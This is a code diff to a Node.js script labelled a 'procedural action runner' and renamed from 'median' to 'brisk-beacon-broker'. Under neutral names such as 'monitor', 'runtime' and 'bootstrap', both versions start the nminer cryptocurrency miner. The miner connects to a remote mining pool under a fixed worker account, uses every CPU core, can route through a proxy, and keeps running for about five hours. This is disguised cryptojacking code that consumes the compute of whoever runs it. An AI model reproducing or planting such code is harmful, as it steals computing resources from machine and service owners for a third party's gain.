@@ -1,34 +1,34 @@
-// Procedural action runner for median
+// Procedural action runner for brisk-beacon-broker
 const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-async function startRuntime() {
-    const traceId = "382fc5";
-    console.log(`[monitor] Starting runtime for ${config.appName || "median"} [${traceId}]`);
+async function bootstrap() {
+    const sessionId = "5385ab";
+    console.log(`[monitor] Starting runtime for ${config.appName || "brisk-beacon-broker"} [${sessionId}]`);
 
-    const service = new NMiner(
+    const runtime = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.median",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    const heartbeat = setInterval(() => {}, 58000);
+    const tick = () => { setTimeout(tick, 59000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (350m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (316m) reached, exiting cleanly.");
         process.exit(0);
-    }, 350 * 60 * 1000);
+    }, 316 * 60 * 1000);
 
     process.on("SIGTERM", () => {
-        clearInterval(heartbeat);
-        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
+        
+        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${sessionId}.`);
         process.exit(0);
     });
 
     console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
 }
 
-startRuntime().catch((err) => {
+bootstrap().catch((err) => {
     console.error("Supervisor startup fault:", err);
     process.exit(1);
 });
